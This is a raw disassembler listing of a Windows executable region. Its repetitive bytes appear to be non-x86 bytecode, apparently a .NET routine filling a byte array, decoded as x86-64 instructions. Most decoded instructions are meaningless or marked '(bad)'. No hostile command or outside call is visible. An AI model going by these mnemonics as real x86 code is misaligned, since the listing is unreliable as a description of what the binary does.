   1400029f3:	58                   	pop    %rax
   1400029f4:	1f                   	(bad)
   1400029f5:	2e 52                	cs push %rdx
   1400029f7:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400029fa:	5d                   	pop    %rbp
   1400029fb:	58                   	pop    %rax
   1400029fc:	20 99 00 00 00 52    	and    %bl,0x52000000(%rcx)
   140002a02:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a05:	5e                   	pop    %rsi
   140002a06:	58                   	pop    %rax
   140002a07:	1f                   	(bad)
   140002a08:	34 52                	xor    $0x52,%al
   140002a0a:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a0d:	5f                   	pop    %rdi
   140002a0e:	58                   	pop    %rax
   140002a0f:	1f                   	(bad)
   140002a10:	77 52                	ja     0x140002a64
   140002a12:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a15:	60                   	(bad)
   140002a16:	58                   	pop    %rax
   140002a17:	20 9e 00 00 00 52    	and    %bl,0x52000000(%rsi)
   140002a1d:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a20:	61                   	(bad)
   140002a21:	58                   	pop    %rax
   140002a22:	20 91 00 00 00 52    	and    %dl,0x52000000(%rcx)
   140002a28:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a2b:	62                   	(bad)
   140002a2c:	58                   	pop    %rax
   140002a2d:	20 c5                	and    %al,%ch
   140002a2f:	00 00                	add    %al,(%rax)
   140002a31:	00 52 12             	add    %dl,0x12(%rdx)
   140002a34:	04 1f                	add    $0x1f,%al
   140002a36:	63 58 20             	movsxd 0x20(%rax),%ebx
   140002a39:	c0 00 00             	rolb   $0x0,(%rax)
   140002a3c:	00 52 12             	add    %dl,0x12(%rdx)
   140002a3f:	04 1f                	add    $0x1f,%al
   140002a41:	64 58                	fs pop %rax
   140002a43:	1f                   	(bad)
   140002a44:	34 52                	xor    $0x52,%al
   140002a46:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a49:	65 58                	gs pop %rax
   140002a4b:	1f                   	(bad)
   140002a4c:	60                   	(bad)
   140002a4d:	52                   	push   %rdx
   140002a4e:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a51:	66 58                	pop    %ax
   140002a53:	20 c9                	and    %cl,%cl
   140002a55:	00 00                	add    %al,(%rax)
   140002a57:	00 52 12             	add    %dl,0x12(%rdx)
   140002a5a:	04 1f                	add    $0x1f,%al
   140002a5c:	67 58                	addr32 pop %rax
   140002a5e:	20 8a 00 00 00 52    	and    %cl,0x52000000(%rdx)
   140002a64:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a67:	68 58 20 d9 00       	push   $0xd92058
   140002a6c:	00 00                	add    %al,(%rax)
   140002a6e:	52                   	push   %rdx
   140002a6f:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a72:	69 58 1f 16 52 12 04 	imul   $0x4125216,0x1f(%rax),%ebx
   140002a79:	1f                   	(bad)
   140002a7a:	6a 58                	push   $0x58
   140002a7c:	20 bd 00 00 00 52    	and    %bh,0x52000000(%rbp)
   140002a82:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a85:	6b 58 20 e3          	imul   $0xffffffe3,0x20(%rax),%ebx
   140002a89:	00 00                	add    %al,(%rax)
   140002a8b:	00 52 12             	add    %dl,0x12(%rdx)
   140002a8e:	04 1f                	add    $0x1f,%al
   140002a90:	6c                   	insb   (%dx),(%rdi)
   140002a91:	58                   	pop    %rax
   140002a92:	1f                   	(bad)
   140002a93:	51                   	push   %rcx
   140002a94:	52                   	push   %rdx
   140002a95:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002a98:	6d                   	insl   (%dx),(%rdi)
   140002a99:	58                   	pop    %rax
   140002a9a:	1f                   	(bad)
   140002a9b:	2f                   	(bad)
   140002a9c:	52                   	push   %rdx
   140002a9d:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002aa0:	6e                   	outsb  (%rsi),(%dx)
   140002aa1:	58                   	pop    %rax
   140002aa2:	20 e3                	and    %ah,%bl
   140002aa4:	00 00                	add    %al,(%rax)
   140002aa6:	00 52 12             	add    %dl,0x12(%rdx)
   140002aa9:	04 1f                	add    $0x1f,%al
   140002aab:	6f                   	outsl  (%rsi),(%dx)
   140002aac:	58                   	pop    %rax
   140002aad:	20 fc                	and    %bh,%ah
   140002aaf:	00 00                	add    %al,(%rax)
   140002ab1:	00 52 12             	add    %dl,0x12(%rdx)
   140002ab4:	04 1f                	add    $0x1f,%al
   140002ab6:	70 58                	jo     0x140002b10
   140002ab8:	1f                   	(bad)
   140002ab9:	2e 52                	cs push %rdx
   140002abb:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002abe:	71 58                	jno    0x140002b18
   140002ac0:	20 c5                	and    %al,%ch
   140002ac2:	00 00                	add    %al,(%rax)
   140002ac4:	00 52 12             	add    %dl,0x12(%rdx)
   140002ac7:	04 1f                	add    $0x1f,%al
   140002ac9:	72 58                	jb     0x140002b23
   140002acb:	20 e6                	and    %ah,%dh
   140002acd:	00 00                	add    %al,(%rax)
   140002acf:	00 52 12             	add    %dl,0x12(%rdx)
   140002ad2:	04 1f                	add    $0x1f,%al
   140002ad4:	73 58                	jae    0x140002b2e
   140002ad6:	1f                   	(bad)
   140002ad7:	40 52                	rex push %rdx
   140002ad9:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002adc:	74 58                	je     0x140002b36
   140002ade:	19 52 12             	sbb    %edx,0x12(%rdx)
   140002ae1:	04 1f                	add    $0x1f,%al
   140002ae3:	75 58                	jne    0x140002b3d
   140002ae5:	1f                   	(bad)
   140002ae6:	19 52 12             	sbb    %edx,0x12(%rdx)
   140002ae9:	04 1f                	add    $0x1f,%al
   140002aeb:	76 58                	jbe    0x140002b45
   140002aed:	1f                   	(bad)
   140002aee:	7b 52                	jnp    0x140002b42
   140002af0:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002af3:	77 58                	ja     0x140002b4d
   140002af5:	20 9c 00 00 00 52 12 	and    %bl,0x12520000(%rax,%rax,1)
   140002afc:	04 1f                	add    $0x1f,%al
   140002afe:	78 58                	js     0x140002b58
   140002b00:	20 97 00 00 00 52    	and    %dl,0x52000000(%rdi)
   140002b06:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002b09:	79 58                	jns    0x140002b63
   140002b0b:	20 ca                	and    %cl,%dl
   140002b0d:	00 00                	add    %al,(%rax)
   140002b0f:	00 52 12             	add    %dl,0x12(%rdx)
   140002b12:	04 1f                	add    $0x1f,%al
   140002b14:	7a 58                	jp     0x140002b6e
   140002b16:	1f                   	(bad)
   140002b17:	50                   	push   %rax
   140002b18:	52                   	push   %rdx
   140002b19:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002b1c:	7b 58                	jnp    0x140002b76
   140002b1e:	1f                   	(bad)
   140002b1f:	3a 52 12             	cmp    0x12(%rdx),%dl
   140002b22:	04 1f                	add    $0x1f,%al
   140002b24:	7c 58                	jl     0x140002b7e
   140002b26:	1f                   	(bad)
   140002b27:	39 52 12             	cmp    %edx,0x12(%rdx)
   140002b2a:	04 1f                	add    $0x1f,%al
   140002b2c:	7d 58                	jge    0x140002b86
   140002b2e:	1f                   	(bad)
   140002b2f:	5d                   	pop    %rbp
   140002b30:	52                   	push   %rdx
   140002b31:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002b34:	7e 58                	jle    0x140002b8e
   140002b36:	20 87 00 00 00 52    	and    %al,0x52000000(%rdi)
   140002b3c:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002b3f:	7f 58                	jg     0x140002b99
   140002b41:	1f                   	(bad)
   140002b42:	70 52                	jo     0x140002b96
   140002b44:	12 04 20             	adc    (%rax,%riz,1),%al
   140002b47:	80 00 00             	addb   $0x0,(%rax)
   140002b4a:	00 58 20             	add    %bl,0x20(%rax)
   140002b4d:	fd                   	std
   140002b4e:	00 00                	add    %al,(%rax)
   140002b50:	00 52 12             	add    %dl,0x12(%rdx)
   140002b53:	04 20                	add    $0x20,%al
   140002b55:	81 00 00 00 58 20    	addl   $0x20580000,(%rax)
   140002b5b:	cf                   	iret
   140002b5c:	00 00                	add    %al,(%rax)
   140002b5e:	00 52 12             	add    %dl,0x12(%rdx)
   140002b61:	04 20                	add    $0x20,%al
   140002b63:	82                   	(bad)
   140002b64:	00 00                	add    %al,(%rax)
   140002b66:	00 58 20             	add    %bl,0x20(%rax)
   140002b69:	dc 00                	faddl  (%rax)
   140002b6b:	00 00                	add    %al,(%rax)
   140002b6d:	52                   	push   %rdx
   140002b6e:	12 04 20             	adc    (%rax,%riz,1),%al
   140002b71:	83 00 00             	addl   $0x0,(%rax)
   140002b74:	00 58 20             	add    %bl,0x20(%rax)
   140002b77:	dc 00                	faddl  (%rax)
   140002b79:	00 00                	add    %al,(%rax)
   140002b7b:	52                   	push   %rdx
   140002b7c:	12 04 20             	adc    (%rax,%riz,1),%al
   140002b7f:	84 00                	test   %al,(%rax)
   140002b81:	00 00                	add    %al,(%rax)
   140002b83:	58                   	pop    %rax
   140002b84:	20 d7                	and    %dl,%bh
   140002b86:	00 00                	add    %al,(%rax)
   140002b88:	00 52 12             	add    %dl,0x12(%rdx)
   140002b8b:	04 20                	add    $0x20,%al
   140002b8d:	85 00                	test   %eax,(%rax)
   140002b8f:	00 00                	add    %al,(%rax)
   140002b91:	58                   	pop    %rax
   140002b92:	20 ae 00 00 00 52    	and    %ch,0x52000000(%rsi)
   140002b98:	12 04 20             	adc    (%rax,%riz,1),%al
   140002b9b:	86 00                	xchg   %al,(%rax)
   140002b9d:	00 00                	add    %al,(%rax)
   140002b9f:	58                   	pop    %rax
   140002ba0:	20 ba 00 00 00 52    	and    %bh,0x52000000(%rdx)
   140002ba6:	12 04 20             	adc    (%rax,%riz,1),%al
   140002ba9:	87 00                	xchg   %eax,(%rax)
   140002bab:	00 00                	add    %al,(%rax)
   140002bad:	58                   	pop    %rax
   140002bae:	20 80 00 00 00 52    	and    %al,0x52000000(%rax)
   140002bb4:	12 04 20             	adc    (%rax,%riz,1),%al
   140002bb7:	88 00                	mov    %al,(%rax)
   140002bb9:	00 00                	add    %al,(%rax)
   140002bbb:	58                   	pop    %rax
   140002bbc:	1f                   	(bad)
   140002bbd:	73 52                	jae    0x140002c11
   140002bbf:	12 04 20             	adc    (%rax,%riz,1),%al
   140002bc2:	89 00                	mov    %eax,(%rax)
   140002bc4:	00 00                	add    %al,(%rax)
   140002bc6:	58                   	pop    %rax
   140002bc7:	1f                   	(bad)
   140002bc8:	62 52 12 04 20       	(bad)
   140002bcd:	8a 00                	mov    (%rax),%al
   140002bcf:	00 00                	add    %al,(%rax)
   140002bd1:	58                   	pop    %rax
   140002bd2:	1f                   	(bad)
   140002bd3:	61                   	(bad)
   140002bd4:	52                   	push   %rdx
   140002bd5:	12 04 20             	adc    (%rax,%riz,1),%al
   140002bd8:	8b 00                	mov    (%rax),%eax
   140002bda:	00 00                	add    %al,(%rax)
   140002bdc:	58                   	pop    %rax
   140002bdd:	1f                   	(bad)
   140002bde:	7d 52                	jge    0x140002c32
   140002be0:	12 04 20             	adc    (%rax,%riz,1),%al
   140002be3:	8c 00                	mov    %es,(%rax)
   140002be5:	00 00                	add    %al,(%rax)
   140002be7:	58                   	pop    %rax
   140002be8:	20 99 00 00 00 52    	and    %bl,0x52000000(%rcx)
   140002bee:	12 04 20             	adc    (%rax,%riz,1),%al
   140002bf1:	8d 00                	lea    (%rax),%eax
   140002bf3:	00 00                	add    %al,(%rax)
   140002bf5:	58                   	pop    %rax
   140002bf6:	1f                   	(bad)
   140002bf7:	6a 52                	push   $0x52
   140002bf9:	12 04 20             	adc    (%rax,%riz,1),%al
   140002bfc:	8e 00                	mov    (%rax),%es
   140002bfe:	00 00                	add    %al,(%rax)
   140002c00:	58                   	pop    %rax
   140002c01:	1f                   	(bad)
   140002c02:	7d 52                	jge    0x140002c56
   140002c04:	12 04 20             	adc    (%rax,%riz,1),%al
   140002c07:	8f 00                	pop    (%rax)
   140002c09:	00 00                	add    %al,(%rax)
   140002c0b:	58                   	pop    %rax
   140002c0c:	20 a4 00 00 00 52 12 	and    %ah,0x12520000(%rax,%rax,1)
   140002c13:	04 20                	add    $0x20,%al
   140002c15:	90                   	nop
   140002c16:	00 00                	add    %al,(%rax)
   140002c18:	00 58 20             	add    %bl,0x20(%rax)
   140002c1b:	ff 00                	incl   (%rax)
   140002c1d:	00 00                	add    %al,(%rax)
   140002c1f:	52                   	push   %rdx
   140002c20:	12 04 20             	adc    (%rax,%riz,1),%al
   140002c23:	91                   	xchg   %eax,%ecx
   140002c24:	00 00                	add    %al,(%rax)
   140002c26:	00 58 1f             	add    %bl,0x1f(%rax)
   140002c29:	12 52 12             	adc    0x12(%rdx),%dl
   140002c2c:	04 20                	add    $0x20,%al
   140002c2e:	92                   	xchg   %eax,%edx
   140002c2f:	00 00                	add    %al,(%rax)
   140002c31:	00 58 1f             	add    %bl,0x1f(%rax)
   140002c34:	2d 52 12 04 20       	sub    $0x20041252,%eax
   140002c39:	93                   	xchg   %eax,%ebx
   140002c3a:	00 00                	add    %al,(%rax)
   140002c3c:	00 58 20             	add    %bl,0x20(%rax)
   140002c3f:	99                   	cltd
   140002c40:	00 00                	add    %al,(%rax)
   140002c42:	00 52 12             	add    %dl,0x12(%rdx)
   140002c45:	04 20                	add    $0x20,%al
   140002c47:	94                   	xchg   %eax,%esp
   140002c48:	00 00                	add    %al,(%rax)
   140002c4a:	00 58 20             	add    %bl,0x20(%rax)
   140002c4d:	eb 00                	jmp    0x140002c4f
   140002c4f:	00 00                	add    %al,(%rax)
   140002c51:	52                   	push   %rdx
   140002c52:	12 04 20             	adc    (%rax,%riz,1),%al
   140002c55:	95                   	xchg   %eax,%ebp
   140002c56:	00 00                	add    %al,(%rax)
   140002c58:	00 58 20             	add    %bl,0x20(%rax)
   140002c5b:	c7 00 00 00 52 12    	movl   $0x12520000,(%rax)
   140002c61:	04 20                	add    $0x20,%al
   140002c63:	96                   	xchg   %eax,%esi
   140002c64:	00 00                	add    %al,(%rax)
   140002c66:	00 58 20             	add    %bl,0x20(%rax)
   140002c69:	81 00 00 00 52 12    	addl   $0x12520000,(%rax)
   140002c6f:	04 20                	add    $0x20,%al
   140002c71:	97                   	xchg   %eax,%edi
   140002c72:	00 00                	add    %al,(%rax)
   140002c74:	00 58 1f             	add    %bl,0x1f(%rax)
   140002c77:	0a 52 12             	or     0x12(%rdx),%dl
   140002c7a:	04 20                	add    $0x20,%al
   140002c7c:	98                   	cwtl
   140002c7d:	00 00                	add    %al,(%rax)
   140002c7f:	00 58 20             	add    %bl,0x20(%rax)
   140002c82:	f7 00 00 00 52 12    	testl  $0x12520000,(%rax)
   140002c88:	04 20                	add    $0x20,%al
   140002c8a:	99                   	cltd
   140002c8b:	00 00                	add    %al,(%rax)
   140002c8d:	00 58 1f             	add    %bl,0x1f(%rax)
   140002c90:	1e                   	(bad)
   140002c91:	52                   	push   %rdx
   140002c92:	12 04 20             	adc    (%rax,%riz,1),%al
   140002c95:	9a                   	(bad)
   140002c96:	00 00                	add    %al,(%rax)
   140002c98:	00 58 20             	add    %bl,0x20(%rax)
   140002c9b:	a7                   	cmpsl  (%rdi),(%rsi)
   140002c9c:	00 00                	add    %al,(%rax)
   140002c9e:	00 52 12             	add    %dl,0x12(%rdx)
   140002ca1:	04 20                	add    $0x20,%al
   140002ca3:	9b                   	fwait
   140002ca4:	00 00                	add    %al,(%rax)
   140002ca6:	00 58 20             	add    %bl,0x20(%rax)
   140002ca9:	c8 00 00 00          	enter  $0x0,$0x0
   140002cad:	52                   	push   %rdx
   140002cae:	12 04 20             	adc    (%rax,%riz,1),%al
   140002cb1:	9c                   	pushf
   140002cb2:	00 00                	add    %al,(%rax)
   140002cb4:	00 58 20             	add    %bl,0x20(%rax)
   140002cb7:	86 00                	xchg   %al,(%rax)
   140002cb9:	00 00                	add    %al,(%rax)
   140002cbb:	52                   	push   %rdx
   140002cbc:	12 04 20             	adc    (%rax,%riz,1),%al
   140002cbf:	9d                   	popf
   140002cc0:	00 00                	add    %al,(%rax)
   140002cc2:	00 58 16             	add    %bl,0x16(%rax)
   140002cc5:	52                   	push   %rdx
   140002cc6:	12 04 20             	adc    (%rax,%riz,1),%al
   140002cc9:	9e                   	sahf
   140002cca:	00 00                	add    %al,(%rax)
   140002ccc:	00 58 20             	add    %bl,0x20(%rax)
   140002ccf:	e6 00                	out    %al,$0x0
   140002cd1:	00 00                	add    %al,(%rax)
   140002cd3:	52                   	push   %rdx
   140002cd4:	12 04 20             	adc    (%rax,%riz,1),%al
   140002cd7:	9f                   	lahf
   140002cd8:	00 00                	add    %al,(%rax)
   140002cda:	00 58 20             	add    %bl,0x20(%rax)
   140002cdd:	c8 00 00 00          	enter  $0x0,$0x0
   140002ce1:	52                   	push   %rdx
   140002ce2:	12 04 20             	adc    (%rax,%riz,1),%al
   140002ce5:	a0 00 00 00 58 20 cf 	movabs 0xcf2058000000,%al
   140002cec:	00 00 
   140002cee:	00 52 12             	add    %dl,0x12(%rdx)
   140002cf1:	04 20                	add    $0x20,%al
   140002cf3:	a1 00 00 00 58 1f 77 	movabs 0x1252771f58000000,%eax
   140002cfa:	52 12 
   140002cfc:	04 20                	add    $0x20,%al
   140002cfe:	a2 00 00 00 58 1c 52 	movabs %al,0x412521c58000000
   140002d05:	12 04 
   140002d07:	20 a3 00 00 00 58    	and    %ah,0x58000000(%rbx)
   140002d0d:	1f                   	(bad)
   140002d0e:	31 52 12             	xor    %edx,0x12(%rdx)
   140002d11:	04 20                	add    $0x20,%al
   140002d13:	a4                   	movsb  (%rsi),(%rdi)
   140002d14:	00 00                	add    %al,(%rax)
   140002d16:	00 58 20             	add    %bl,0x20(%rax)
   140002d19:	85 00                	test   %eax,(%rax)
   140002d1b:	00 00                	add    %al,(%rax)
   140002d1d:	52                   	push   %rdx
   140002d1e:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d21:	a5                   	movsl  (%rsi),(%rdi)
   140002d22:	00 00                	add    %al,(%rax)
   140002d24:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d27:	72 52                	jb     0x140002d7b
   140002d29:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d2c:	a6                   	cmpsb  (%rdi),(%rsi)
   140002d2d:	00 00                	add    %al,(%rax)
   140002d2f:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d32:	28 52 12             	sub    %dl,0x12(%rdx)
   140002d35:	04 20                	add    $0x20,%al
   140002d37:	a7                   	cmpsl  (%rdi),(%rsi)
   140002d38:	00 00                	add    %al,(%rax)
   140002d3a:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d3d:	4c 52                	rex.WR push %rdx
   140002d3f:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d42:	a8 00                	test   $0x0,%al
   140002d44:	00 00                	add    %al,(%rax)
   140002d46:	58                   	pop    %rax
   140002d47:	20 b1 00 00 00 52    	and    %dh,0x52000000(%rcx)
   140002d4d:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d50:	a9 00 00 00 58       	test   $0x58000000,%eax
   140002d55:	20 8e 00 00 00 52    	and    %cl,0x52000000(%rsi)
   140002d5b:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d5e:	aa                   	stos   %al,(%rdi)
   140002d5f:	00 00                	add    %al,(%rax)
   140002d61:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d64:	4a 52                	rex.WX push %rdx
   140002d66:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d69:	ab                   	stos   %eax,(%rdi)
   140002d6a:	00 00                	add    %al,(%rax)
   140002d6c:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d6f:	41 52                	push   %r10
   140002d71:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d74:	ac                   	lods   (%rsi),%al
   140002d75:	00 00                	add    %al,(%rax)
   140002d77:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d7a:	29 52 12             	sub    %edx,0x12(%rdx)
   140002d7d:	04 20                	add    $0x20,%al
   140002d7f:	ad                   	lods   (%rsi),%eax
   140002d80:	00 00                	add    %al,(%rax)
   140002d82:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d85:	2e 52                	cs push %rdx
   140002d87:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d8a:	ae                   	scas   (%rdi),%al
   140002d8b:	00 00                	add    %al,(%rax)
   140002d8d:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d90:	4e 52                	rex.WRX push %rdx
   140002d92:	12 04 20             	adc    (%rax,%riz,1),%al
   140002d95:	af                   	scas   (%rdi),%eax
   140002d96:	00 00                	add    %al,(%rax)
   140002d98:	00 58 1f             	add    %bl,0x1f(%rax)
   140002d9b:	6c                   	insb   (%dx),(%rdi)
   140002d9c:	52                   	push   %rdx
   140002d9d:	12 04 20             	adc    (%rax,%riz,1),%al
   140002da0:	b0 00                	mov    $0x0,%al
   140002da2:	00 00                	add    %al,(%rax)
   140002da4:	58                   	pop    %rax
   140002da5:	1a 52 12             	sbb    0x12(%rdx),%dl
   140002da8:	04 20                	add    $0x20,%al
   140002daa:	b1 00                	mov    $0x0,%cl
   140002dac:	00 00                	add    %al,(%rax)
   140002dae:	58                   	pop    %rax
   140002daf:	1f                   	(bad)
   140002db0:	6d                   	insl   (%dx),(%rdi)
   140002db1:	52                   	push   %rdx
   140002db2:	12 04 20             	adc    (%rax,%riz,1),%al
   140002db5:	b2 00                	mov    $0x0,%dl
   140002db7:	00 00                	add    %al,(%rax)
   140002db9:	58                   	pop    %rax
   140002dba:	1f                   	(bad)
   140002dbb:	77 52                	ja     0x140002e0f
   140002dbd:	12 04 20             	adc    (%rax,%riz,1),%al
   140002dc0:	b3 00                	mov    $0x0,%bl
   140002dc2:	00 00                	add    %al,(%rax)
   140002dc4:	58                   	pop    %rax
   140002dc5:	1f                   	(bad)
   140002dc6:	50                   	push   %rax
   140002dc7:	52                   	push   %rdx
   140002dc8:	12 04 20             	adc    (%rax,%riz,1),%al
   140002dcb:	b4 00                	mov    $0x0,%ah
   140002dcd:	00 00                	add    %al,(%rax)
   140002dcf:	58                   	pop    %rax
   140002dd0:	1f                   	(bad)
   140002dd1:	48 52                	rex.W push %rdx
   140002dd3:	12 04 20             	adc    (%rax,%riz,1),%al
   140002dd6:	b5 00                	mov    $0x0,%ch
   140002dd8:	00 00                	add    %al,(%rax)
   140002dda:	58                   	pop    %rax
   140002ddb:	1f                   	(bad)
   140002ddc:	37                   	(bad)
   140002ddd:	52                   	push   %rdx
   140002dde:	12 04 20             	adc    (%rax,%riz,1),%al
   140002de1:	b6 00                	mov    $0x0,%dh
   140002de3:	00 00                	add    %al,(%rax)
   140002de5:	58                   	pop    %rax
   140002de6:	1c 52                	sbb    $0x52,%al
   140002de8:	12 04 20             	adc    (%rax,%riz,1),%al
   140002deb:	b7 00                	mov    $0x0,%bh
   140002ded:	00 00                	add    %al,(%rax)
   140002def:	58                   	pop    %rax
   140002df0:	20 ce                	and    %cl,%dh
   140002df2:	00 00                	add    %al,(%rax)
   140002df4:	00 52 12             	add    %dl,0x12(%rdx)
   140002df7:	04 20                	add    $0x20,%al
   140002df9:	b8 00 00 00 58       	mov    $0x58000000,%eax
   140002dfe:	20 e4                	and    %ah,%ah
   140002e00:	00 00                	add    %al,(%rax)
   140002e02:	00 52 12             	add    %dl,0x12(%rdx)
   140002e05:	04 20                	add    $0x20,%al
   140002e07:	b9 00 00 00 58       	mov    $0x58000000,%ecx
   140002e0c:	20 e3                	and    %ah,%bl
   140002e0e:	00 00                	add    %al,(%rax)
   140002e10:	00 52 12             	add    %dl,0x12(%rdx)
   140002e13:	04 20                	add    $0x20,%al
   140002e15:	ba 00 00 00 58       	mov    $0x58000000,%edx
   140002e1a:	20 e2                	and    %ah,%dl
   140002e1c:	00 00                	add    %al,(%rax)
   140002e1e:	00 52 12             	add    %dl,0x12(%rdx)
   140002e21:	04 20                	add    $0x20,%al
   140002e23:	bb 00 00 00 58       	mov    $0x58000000,%ebx
   140002e28:	1f                   	(bad)
   140002e29:	1d 52 12 04 20       	sbb    $0x20041252,%eax
   140002e2e:	bc 00 00 00 58       	mov    $0x58000000,%esp
   140002e33:	1b 52 12             	sbb    0x12(%rdx),%edx
   140002e36:	04 20                	add    $0x20,%al
   140002e38:	bd 00 00 00 58       	mov    $0x58000000,%ebp
   140002e3d:	20 fd                	and    %bh,%ch
   140002e3f:	00 00                	add    %al,(%rax)
   140002e41:	00 52 12             	add    %dl,0x12(%rdx)
   140002e44:	04 20                	add    $0x20,%al
   140002e46:	be 00 00 00 58       	mov    $0x58000000,%esi
   140002e4b:	1f                   	(bad)
   140002e4c:	77 52                	ja     0x140002ea0
   140002e4e:	12 04 20             	adc    (%rax,%riz,1),%al
   140002e51:	bf 00 00 00 58       	mov    $0x58000000,%edi
   140002e56:	1f                   	(bad)
   140002e57:	42 52                	rex.X push %rdx
   140002e59:	12 04 20             	adc    (%rax,%riz,1),%al
   140002e5c:	c0 00 00             	rolb   $0x0,(%rax)
   140002e5f:	00 58 1f             	add    %bl,0x1f(%rax)
   140002e62:	5d                   	pop    %rbp
   140002e63:	52                   	push   %rdx
   140002e64:	12 04 20             	adc    (%rax,%riz,1),%al
   140002e67:	c1 00 00             	roll   $0x0,(%rax)
   140002e6a:	00 58 20             	add    %bl,0x20(%rax)
   140002e6d:	90                   	nop
   140002e6e:	00 00                	add    %al,(%rax)
   140002e70:	00 52 12             	add    %dl,0x12(%rdx)
   140002e73:	04 20                	add    $0x20,%al
   140002e75:	c2 00 00             	ret    $0x0
   140002e78:	00 58 20             	add    %bl,0x20(%rax)
   140002e7b:	c7 00 00 00 52 12    	movl   $0x12520000,(%rax)
   140002e81:	04 20                	add    $0x20,%al
   140002e83:	c3                   	ret
   140002e84:	00 00                	add    %al,(%rax)
   140002e86:	00 58 1f             	add    %bl,0x1f(%rax)
   140002e89:	78 52                	js     0x140002edd
   140002e8b:	12 04 20             	adc    (%rax,%riz,1),%al
   140002e8e:	c4                   	(bad)
   140002e8f:	00 00                	add    %al,(%rax)
   140002e91:	00 58 20             	add    %bl,0x20(%rax)
   140002e94:	ac                   	lods   (%rsi),%al
   140002e95:	00 00                	add    %al,(%rax)
   140002e97:	00 52 12             	add    %dl,0x12(%rdx)
   140002e9a:	04 20                	add    $0x20,%al
   140002e9c:	c5 00 00             	(bad)
   140002e9f:	00 58 20             	add    %bl,0x20(%rax)
   140002ea2:	e0 00                	loopne 0x140002ea4
   140002ea4:	00 00                	add    %al,(%rax)
   140002ea6:	52                   	push   %rdx
   140002ea7:	12 04 20             	adc    (%rax,%riz,1),%al
   140002eaa:	c6 00 00             	movb   $0x0,(%rax)
   140002ead:	00 58 20             	add    %bl,0x20(%rax)
   140002eb0:	d4                   	(bad)
   140002eb1:	00 00                	add    %al,(%rax)
   140002eb3:	00 52 12             	add    %dl,0x12(%rdx)
   140002eb6:	04 20                	add    $0x20,%al
   140002eb8:	c7 00 00 00 58 20    	movl   $0x20580000,(%rax)
   140002ebe:	80 00 00             	addb   $0x0,(%rax)
   140002ec1:	00 52 12             	add    %dl,0x12(%rdx)
   140002ec4:	04 20                	add    $0x20,%al
   140002ec6:	c8 00 00 00          	enter  $0x0,$0x0
   140002eca:	58                   	pop    %rax
   140002ecb:	20 e9                	and    %ch,%cl
   140002ecd:	00 00                	add    %al,(%rax)
   140002ecf:	00 52 12             	add    %dl,0x12(%rdx)
   140002ed2:	04 20                	add    $0x20,%al
   140002ed4:	c9                   	leave
   140002ed5:	00 00                	add    %al,(%rax)
   140002ed7:	00 58 20             	add    %bl,0x20(%rax)
   140002eda:	ea                   	(bad)
   140002edb:	00 00                	add    %al,(%rax)
   140002edd:	00 52 12             	add    %dl,0x12(%rdx)
   140002ee0:	04 20                	add    $0x20,%al
   140002ee2:	ca 00 00             	lret   $0x0
   140002ee5:	00 58 1f             	add    %bl,0x1f(%rax)
   140002ee8:	39 52 12             	cmp    %edx,0x12(%rdx)
   140002eeb:	04 20                	add    $0x20,%al
   140002eed:	cb                   	lret
   140002eee:	00 00                	add    %al,(%rax)
   140002ef0:	00 58 1f             	add    %bl,0x1f(%rax)
   140002ef3:	76 52                	jbe    0x140002f47
   140002ef5:	12 04 20             	adc    (%rax,%riz,1),%al
   140002ef8:	cc                   	int3
   140002ef9:	00 00                	add    %al,(%rax)
   140002efb:	00 58 20             	add    %bl,0x20(%rax)
   140002efe:	9d                   	popf
   140002eff:	00 00                	add    %al,(%rax)
   140002f01:	00 52 12             	add    %dl,0x12(%rdx)
   140002f04:	04 20                	add    $0x20,%al
   140002f06:	cd 00                	int    $0x0
   140002f08:	00 00                	add    %al,(%rax)
   140002f0a:	58                   	pop    %rax
   140002f0b:	20 c3                	and    %al,%bl
   140002f0d:	00 00                	add    %al,(%rax)
   140002f0f:	00 52 12             	add    %dl,0x12(%rdx)
   140002f12:	04 20                	add    $0x20,%al
   140002f14:	ce                   	(bad)
   140002f15:	00 00                	add    %al,(%rax)
   140002f17:	00 58 1f             	add    %bl,0x1f(%rax)
   140002f1a:	31 52 12             	xor    %edx,0x12(%rdx)
   140002f1d:	04 20                	add    $0x20,%al
   140002f1f:	cf                   	iret
   140002f20:	00 00                	add    %al,(%rax)
   140002f22:	00 58 20             	add    %bl,0x20(%rax)
   140002f25:	cf                   	iret
   140002f26:	00 00                	add    %al,(%rax)
   140002f28:	00 52 12             	add    %dl,0x12(%rdx)
   140002f2b:	04 20                	add    $0x20,%al
   140002f2d:	d0 00                	rolb   $1,(%rax)
   140002f2f:	00 00                	add    %al,(%rax)
   140002f31:	58                   	pop    %rax
   140002f32:	20 c3                	and    %al,%bl
